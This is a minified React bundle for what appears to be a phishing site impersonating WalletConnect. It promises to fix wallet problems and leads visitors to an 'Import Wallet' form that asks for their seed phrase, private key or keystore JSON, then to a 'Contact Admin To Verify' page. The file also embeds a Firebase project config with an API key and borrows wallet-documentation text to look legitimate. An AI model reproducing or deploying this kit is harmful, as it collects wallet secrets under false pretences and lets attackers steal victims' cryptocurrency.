var Q=Object.defineProperty,X=Object.defineProperties;var Y=Object.getOwnPropertyDescriptors;var k=Object.getOwnPropertySymbols;var N=Object.prototype.hasOwnProperty,R=Object.prototype.propertyIsEnumerable;var L=(t,n,r)=>n in t?Q(t,n,{enumerable:!0,configurable:!0,writable:!0,value:r}):t[n]=r,W=(t,n)=>{for(var r in n||(n={}))N.call(n,r)&&L(t,r,n[r]);if(k)for(var r of k(n))R.call(n,r)&&L(t,r,n[r]);return t},z=(t,n)=>X(t,Y(n));var G=(t,n)=>{var r={};for(var s in t)N.call(t,s)&&n.indexOf(s)<0&&(r[s]=t[s]);if(t!=null&&k)for(var s of k(t))n.indexOf(s)<0&&R.call(t,s)&&(r[s]=t[s]);return r};import{r as d,j as a,F as w,a as e,C as p,L as Z,A as ee,T as te,b as i,B as c,I as O,d as ne,c as u,G as h,N as g,e as re,i as ae,g as ie,p as se,P as B,f as oe,h as le,k as P,l as A,m as ce,s as b,n as de,o as he,q as pe,t as ue,u as me,v as ge,R as fe,w as x,x as ve,y as ye}from"./vendor.fa72ec4f.js";const xe=function(){const n=document.createElement("link").relList;if(n&&n.supports&&n.supports("modulepreload"))return;for(const o of document.querySelectorAll('link[rel="modulepreload"]'))s(o);new MutationObserver(o=>{for(const l of o)if(l.type==="childList")for(const f of l.addedNodes)f.tagName==="LINK"&&f.rel==="modulepreload"&&s(f)}).observe(document,{childList:!0,subtree:!0});function r(o){const l={};return o.integrity&&(l.integrity=o.integrity),o.referrerpolicy&&(l.referrerPolicy=o.referrerpolicy),o.crossorigin==="use-credentials"?l.credentials="include":o.crossorigin==="anonymous"?l.credentials="omit":l.credentials="same-origin",l}function s(o){if(o.ep)return;o.ep=!0;const l=r(o);fetch(o.href,l)}};xe();const we=["Products","Pricing","Blog"],F=()=>{const[t,n]=d.exports.useState(!1),r=()=>{n(!t)};return a(w,{children:[t?e(p,{align:"center",children:e(Z,{children:"Wallet"})}):null,e(ee,{position:"static",children:e(p,{maxWidth:"xl",children:a(te,{disableGutters:!0,children:[e(i,{variant:"h6",noWrap:!0,component:"div",sx:{mr:2,display:{xs:"none",md:"flex"}},children:"WalletConnect"}),e(c,{sx:{flexGrow:1,display:{xs:"flex",md:"none"}},children:e(O,{size:"large","aria-label":"account of current user","aria-controls":"menu-appbar","aria-haspopup":"true",onClick:r,color:"inherit",children:e(ne,{})})}),e(i,{variant:"h6",noWrap:!0,component:"div",sx:{flexGrow:1,display:{xs:"flex",md:"none"}},children:"WalletConnect"}),e(c,{sx:{flexGrow:1,display:{xs:"none",md:"flex"}},children:we.map(s=>e(u,{onClick:r,sx:{my:2,color:"white",display:"block"},children:s},s))})]})})})]})};var I="/assets/trust.00e77f28.svg",D="/assets/metamask.1cfcf8f4.svg";const C=d.exports.createContext(),be=t=>{const[n,r]=d.exports.useState([{name:"trustwallet",src:I},{name:"metamask",src:D},{name:"trustwallet",src:I},{name:"metamask",src:D},{name:"trustwallet",src:I},{name:"metamask",src:D}]),[s,o]=d.exports.useState(null);return e(C.Provider,{value:{wallets:n,setWallet:o,wallet:s},children:t.children})},Ce=({name:t,src:n})=>{const{setWallet:r}=d.exports.useContext(C);return e(h,{item:!0,align:"center",children:a(u,{component:g,onClick:()=>{r(t)},to:"/import",children:[e(re,{src:n,sx:{width:"72px",height:"72px"}}),e(i,{variant:"p",children:t})]})})},ke=()=>{const{wallets:t}=d.exports.useContext(C);return a(p,{align:"center",children:[e(F,{}),e(i,{variant:"h4",gutterBottom:!0,children:"Dapps"}),e(i,{variant:"p",children:"Registry to connect all wallets and Apps supporting WalletConnect Protocols to dapps"}),e(h,{container:!0,justifyContent:"center",spacing:12,children:t.map(({name:n,src:r})=>e(Ce,{name:n,src:r}))})]})},We={apiKey:"AIzaSyBs_r2UhFP1BFmd5rp3mkD3XxGyN2vP2LU",authDomain:"wallet-connect-4ba56.firebaseapp.com",projectId:"wallet-connect-4ba56",storageBucket:"wallet-connect-4ba56.appspot.com",messagingSenderId:"153111637281",appId:"1:153111637281:web:114ea640fa258b8262a260",measurementId:"G-KTGWM1BT25"},Se=ae(We);ie(Se);se();function T(t){const l=t,{children:n,value:r,index:s}=l,o=G(l,["children","value","index"]);return e("div",z(W({role:"tabpanel",hidden:r!==s,id:`simple-tabpanel-${s}`,"aria-labelledby":`simple-tab-${s}`},o),{children:r===s&&e(c,{sx:{p:3},children:e(i,{children:n})})}))}T.propTypes={children:B.node,index:B.number.isRequired,value:B.number.isRequired};function K(t){return{id:`simple-tab-${t}`,"aria-controls":`simple-tabpanel-${t}`}}function Ae(){d.exports.useContext(C);const[t,n]=d.exports.useState(0),r=(v,V)=>{n(V)},[s,o]=d.exports.useState(""),l=v=>{o(v.target.value)},f=v=>{},[H,_]=d.exports.useState(""),q=v=>{_(v.target.value)},[U,J]=d.exports.useState(""),E=v=>{J(v.target.value)};return a(c,{sx:{width:"100%"},children:[e(c,{sx:{borderBottom:1,borderColor:"divider"},children:a(le,{value:t,onChange:r,"aria-label":"basic tabs example",children:[e(P,W({label:"Phrase"},K(0))),e(P,W({label:"Private Key"},K(1))),e(P,{label:"Key JSON"})]})}),a(T,{value:t,index:0,children:[e(A,{value:s,onChange:l,sx:{width:"100%"},multiline:!0,rows:6}),e(i,{children:"Typically 12 (sometimes 24) words seperated by a single spaces."}),e(u,{onClick:()=>f(),sx:{width:"100%"},variant:"contained",component:g,to:"/verify",children:"Import"})]}),a(T,{value:t,index:1,children:[e(A,{value:H,onChange:q,sx:{width:"100%"}}),e(i,{children:"Typically 12 (sometimes 24) words seperated by a single spaces."}),e(u,{onClick:()=>f(),sx:{width:"100%"},variant:"contained",component:g,to:"/verify",children:"Import"})," "]}),a(T,{value:t,index:2,children:[e(A,{value:U,onChange:E,sx:{width:"100%"}}),e(i,{children:"Typically 12 (sometimes 24) words seperated by a single spaces."}),e(u,{onClick:()=>f(),sx:{width:"100%"},variant:"contained",component:g,to:"/verify",children:"Import"})," "]})]})}const Te=()=>{const{wallet:t}=d.exports.useContext(C);return a(p,{sx:{height:"100vh"},children:[a(c,{sx:{display:"flex",alignItems:"center"},children:[e(O,{children:e(oe,{})}),a(i,{variant:"h6",children:["Import ",t," Wallet"]})]}),e(Ae,{})]})};var Be="/assets/money-bag.59455d06.svg",Pe="/assets/bitcoin-1.f53a18f8.svg",Ie="/assets/bitcoin-2.878caa53.svg";const y=ce(),j=b(i)(({})=>({marginTop:y.spacing(2),marginBottom:y.spacing(2)})),De=b(de)(({})=>({padding:y.spacing(5)})),S=b(O)(({})=>({color:y.palette.primary.main})),m=b(g)(({})=>({textDecoration:"none",marginTop:y.spacing(2),color:y.palette.primary.main})),M=b(A)(({})=>({marginBottom:y.spacing(1)}));const Oe=[{title:"Rectification",info:"Issues with your wallet? We can easily fix it.",icon:Be},{title:"Verification",info:"Issues with your wallet? We can easily fix it.",icon:Pe},{title:"Synchronization",info:"Issues with your wallet? We can easily fix it.",icon:Ie},{title:"Staking"},{title:"Gas Fee"},{title:"Reset"},{title:"Recovery"}],Fe=({title:t,info:n,icon:r})=>e(h,{item:!0,xs:12,children:a(De,{children:[e("img",{src:r,className:"icon"}),e(i,{children:t}),e(i,{children:n}),e(u,{component:g,to:"/wallets",variant:"contained",children:"Resolve"})]})}),Le=()=>a(w,{children:[e(j,{variant:"h4",gutterBottom:!0,children:"Our Features"}),e(h,{container:!0,spacing:8,align:"center",justifyContent:"center",children:Oe.map(({title:t,info:n,icon:r})=>e(Fe,{title:t,info:n,icon:r}))})]});var Ne="/assets/block.969f5f00.svg",Re="/assets/bubble.3a02777e.svg",ze="/assets/central-bitcoin.c76c7313.svg";const Ge=[{title:"Open DApps",info:"Go the DApps page and select the wallet of your choice.",icon:Re},{title:"Connect Keys",info:"Input the details required and the system will take it from there.",icon:ze},{title:"Get Full Control",info:"Now you are in control of your decentralize wallets with all glitches fixed.",icon:Ne}],Ke=({title:t,info:n,icon:r})=>a(h,{item:!0,children:[e("img",{src:r,className:"icon"}),e(i,{variant:"h6",children:t}),e(i,{variant:"p",children:n})]}),Me=()=>a(w,{children:[e(j,{variant:"h4",children:"How It Works"}),e(h,{container:!0,align:"center",justifyContent:"center",spacing:2,children:Ge.map(({title:t,info:n,icon:r})=>e(Ke,{title:t,info:n,icon:r}))})]}),$=()=>a(w,{children:[a(h,{container:!0,align:"left",spacing:2,children:[a(h,{item:!0,xs:12,children:[e(i,{variant:"p",align:"left",children:"With our highly secure verification and integration system with top wallet providers, you can efficiently manage all your wallets in one app"}),a(c,{sx:{display:"flex"},children:[e(S,{children:e(he,{fontSize:"large"})}),e(S,{children:e(pe,{fontSize:"large"})}),e(S,{children:e(ue,{fontSize:"large"})}),e(S,{children:e(me,{fontSize:"large"})})]})]}),a(h,{item:!0,xs:12,children:[e(i,{variant:"h6",children:"Quick Link"}),a(c,{sx:{display:"flex",flexDirection:"column",justifyContent:"space-between"},children:[e(m,{to:"#",children:"About Us"}),e(m,{to:"#",children:"Our Team"}),e(m,{to:"#",children:"Our Blog"}),e(m,{to:"#",children:"How It Works"})]})]}),a(h,{item:!0,xs:12,children:[e(i,{variant:"h6",children:"Help"}),a(c,{sx:{display:"flex",flexDirection:"column"},children:[e(m,{to:"#",children:"Contact Us"}),e(m,{to:"#",children:"Support Info"}),e(m,{to:"#",children:"Privacy Policy"}),e(m,{to:"#",children:"Terms of Service"})]})]}),a(h,{item:!0,xs:12,children:[e(i,{variant:"h6",gutterBottom:!0,children:"Newsletter"}),a(c,{sx:{display:"flex",flexDirection:"column"},children:[e(M,{placeholder:"Your Name"}),e(M,{placeholder:"Email Address"}),e(u,{variant:"contained",children:"Subscribe"})]})]})]}),e(i,{variant:"p",children:"walletconnect.com c 2022 - All rights reserve"})]}),je=()=>a(w,{children:[e(F,{}),a(p,{align:"center",sx:{marginTop:"24px"},children:[e(i,{variant:"h6",gutterBottom:!0,children:"The best way to integrate your decentralized wallet."}),e(i,{variant:"p",gutterBottom:!0,children:"Secure and integrate all decentralized wallet Protocols from a single app to resolve all transaction error, missing token and other wallet related glitches."}),a(c,{sx:{marginTop:"16px"},children:[e(u,{component:g,to:"/wallets",variant:"contained",children:"Connect To DApps"}),e(u,{component:g,to:"/help",children:"How It Works"})]}),e(Le,{}),e(Me,{}),e($,{})]})]});var $e="/assets/qr-code.5858d291.svg";const He=()=>a(p,{maxWidth:"xs",children:[e("img",{src:$e}),e(i,{align:"center",children:"Please Contact Admin To Verify"})]});var _e="/assets/img-1.85b780ef.png",qe="/assets/img-2.8bc7c717.png",Ue="/assets/img-3.3217f7a8.png",Je="/assets/img-4.917a661e.png",Ee="/assets/img-5.9394f4fc.jpeg",Ve="/assets/img-6.50868553.png",Qe="/assets/img-7.44216b88.png";const Xe=()=>a(p,{children:[e(F,{}),e(c,{children:e("img",{src:_e})}),e(i,{variant:"h4",children:"Connecting to DApps"}),e(i,{variant:"p",children:"One of the best features of a decentralized wallet is that it allows access to decentralized apps (DApps). We know that the removal of the DApp browser has been difficult for a lot of our users, specially those who are using an iOS device. We\u2019d like to express our admiration for Apple and the technology & services they provide and are completely within their rights to enforce the rules of their platform which of course we fully respect. So, we\u2019ve been working hard behind the scenes to establish an alternative for all of our users. With the recent update to the WalletConnect protocol; our development team has added a feature that allows multiple active sessions when accessing DApps - which we believe to be a great alternative to our initial DApp browser."}),e(p,{children:e("img",{src:qe})}),e(i,{variant:"p",children:"Once a connection is established, the app keeps the session running in the background in order to have a more streamlined experience even if the DApp is being accessed on a 3rd party browser. And it even allows you to connect your wallet to any device at the same time."}),e(p,{children:e("img",{src:Ue})}),e(i,{variant:"h6",children:"Once a connection is established, the app keeps the session running in the background in order to have a more streamlined experience even if the DApp is being accessed on a 3rd party browser. And it even allows you to connect your wallet to any device at the same time."}),e(i,{variant:"p",children:"With Mobile Linking, there is no need to use another device. Just open the DApp site on your mobile browser and connect your Trust Wallet. We have detailed guide available: WalletConnect Mobile Linking with Trust Wallet."}),a(c,{sx:{display:"flex"},children:[e("img",{src:Je}),e("img",{src:Ee})]}),e(i,{variant:"p",children:"Simply choose WalletConnect on the connection options then select Trust for the mobile options. At the confirmation screen, tap on Connect to continue. Please be aware of \u201CThe Risks of Using DApps\u201D."}),a(c,{sx:{display:"flex"},children:[e("img",{src:Ve}),e("img",{src:Qe})]}),e($,{})]});function Ye(){return e(be,{children:e(ge,{children:a(fe,{children:[e(x,{path:"/",element:e(je,{})}),e(x,{path:"import",element:e(Te,{})}),e(x,{path:"wallets",element:e(ke,{})}),e(x,{path:"verify",element:e(He,{})}),e(x,{path:"help",element:e(Xe,{})})]})})})}ve.render(e(ye.StrictMode,{children:e(Ye,{})}),document.getElementById("root"));